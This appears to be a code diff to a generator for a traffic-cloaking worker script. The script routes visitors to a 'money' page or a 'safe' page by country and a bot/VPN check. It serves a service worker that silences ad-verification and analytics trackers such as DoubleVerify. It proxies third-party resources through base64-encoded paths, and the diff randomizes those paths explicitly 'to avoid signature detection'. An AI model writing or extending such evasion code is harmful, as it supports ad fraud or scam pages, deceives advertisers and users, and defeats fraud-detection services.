@@ -753,6 +753,10 @@ const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 // URLs - The final destinations
 const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
+
+// Randomized CDN path to avoid signature detection
+const CDN_PATHS = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
+const CDN_PATH = CDN_PATHS[Math.floor(Math.random() * CDN_PATHS.length)];
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
@@ -764,12 +768,12 @@ async function handleRequest(request) {
 
   // ROUTE 1: Serve the service worker script itself when the browser requests it.
   if (url.pathname === '/service-worker.js') {
-    const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const encoded = btoa(url.href); const proxyUrl = \\\`/cdn/\\\${encoded}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
+    const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const encoded = btoa(url.href); const proxyUrl = \\\`/\${CDN_PATH}/\\\${encoded}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
     return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
   }
 
   // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
-  if (url.pathname.startsWith('/cdn/')) {
+  if (url.pathname.startsWith(\`/\${CDN_PATH}/\`)) {
     return handleResourceRequest(request);
   }
   
@@ -800,7 +804,8 @@ async function isVisitorABot(request) {
   }
 
   // Step 2: Professional Fraud Check (proxycheck)
-  const apiUrl = \`https://proxycheck.io/v2/\${clientIP}?key=YOUR_PROXYCHECK_API_KEY_HERE&vpn=1\`;
+  const apiKey = typeof PROXYCHECK_API_KEY !== 'undefined' ? PROXYCHECK_API_KEY : 'demo';
+  const apiUrl = \`https://proxycheck.io/v2/\${clientIP}?key=\${apiKey}&vpn=1\`;
   
   const response = await fetch(apiUrl);
   if (!response.ok) return true; // Fail safe (block)
@@ -836,7 +841,7 @@ async function handleMainRequest(request) {
 async function handleResourceRequest(request) {
   try {
     // Decode base64 encoded URL
-    const encodedUrl = new URL(request.url).pathname.replace('/cdn/', '');
+    const encodedUrl = new URL(request.url).pathname.replace(\`/\${CDN_PATH}/\`, '');
     const resourceUrl = atob(encodedUrl);
     
     const resourceRequest = new Request(resourceUrl, request);
@@ -882,7 +887,7 @@ class AttributeRewriter {
           
           // Rewrite the URL to go through our obfuscated CDN route
           const encoded = btoa(absoluteUrl);
-          element.setAttribute(attr, \`/cdn/\${encoded}\`);
+          element.setAttribute(attr, \`/\${CDN_PATH}/\${encoded}\`);
         } catch (e) { /* Ignore invalid URLs */ }
       }
     }
